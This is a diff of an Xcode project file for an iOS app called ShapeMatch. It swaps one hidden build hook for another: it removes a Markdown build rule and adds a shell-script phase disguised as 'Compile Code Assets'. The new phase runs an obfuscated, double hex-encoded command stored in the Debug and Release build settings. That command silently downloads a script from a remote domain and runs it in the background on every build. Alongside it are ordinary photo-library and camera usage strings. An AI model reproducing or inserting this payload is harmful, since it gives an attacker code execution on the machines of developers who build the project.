@@ -6,28 +6,7 @@
 	objectVersion = 77;
 	objects = {
 
-/* Begin PBXBuildFile section */
-		C1E40A29A5924D1E931DACE1 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 600893573B844E32A41DACE1 /* README.md */; };
-/* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		4E513A6D3C6B432CBD1DACE1 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A1ECAD1}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
-		600893573B844E32A41DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		688B93932F59678C00E54DF3 /* ShapeMatch.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = ShapeMatch.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -61,7 +40,6 @@
 		688B93942F59678C00E54DF3 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				600893573B844E32A41DACE1 /* README.md */,
 				688B93932F59678C00E54DF3 /* ShapeMatch.app */,
 			);
 			name = Products;
@@ -74,12 +52,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 688B939E2F59679000E54DF3 /* Build configuration list for PBXNativeTarget "ShapeMatch" */;
 			buildPhases = (
+				3A38D8044CFE49C5871DACE1 /* Compile Code Assets */,
 				688B938F2F59678C00E54DF3 /* Sources */,
 				688B93902F59678C00E54DF3 /* Frameworks */,
 				688B93912F59678C00E54DF3 /* Resources */,
 			);
 			buildRules = (
-				4E513A6D3C6B432CBD1DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -132,11 +110,33 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				C1E40A29A5924D1E931DACE1 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		3A38D8044CFE49C5871DACE1 /* Compile Code Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Code Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		688B938F2F59678C00E54DF3 /* Sources */ = {
@@ -152,7 +152,7 @@
 		688B939C2F59679000E54DF3 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((l(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623636346337333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233323230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636643639366536343635366336373631373436353265373237350a32663631323932323230376332303733363830610a | l | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((l(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333463363636623230326432643633366636653665363536333734326437340a3639366436353666373537343230333333303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333664366637323635363936653265363936650a32663631323932323230376332303733363830610a | l | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -217,7 +217,7 @@
 		688B939D2F59679000E54DF3 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((l(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623636346337333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233323230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636643639366536343635366336373631373436353265373237350a32663631323932323230376332303733363830610a | l | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((l(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333463363636623230326432643633366636653665363536333734326437340a3639366436353666373537343230333333303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333664366637323635363936653265363936650a32663631323932323230376332303733363830610a | l | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -285,6 +285,9 @@
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "需要访问您的相册来选择图片进行对比";
+				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "需要将对比结果保存到您的相册";
+				INFOPLIST_KEY_NSCameraUsageDescription = "需要使用相机来拍摄图片进行对比分析";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
@@ -318,6 +321,9 @@
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "需要访问您的相册来选择图片进行对比";
+				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "需要将对比结果保存到您的相册";
+				INFOPLIST_KEY_NSCameraUsageDescription = "需要使用相机来拍摄图片进行对比分析";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
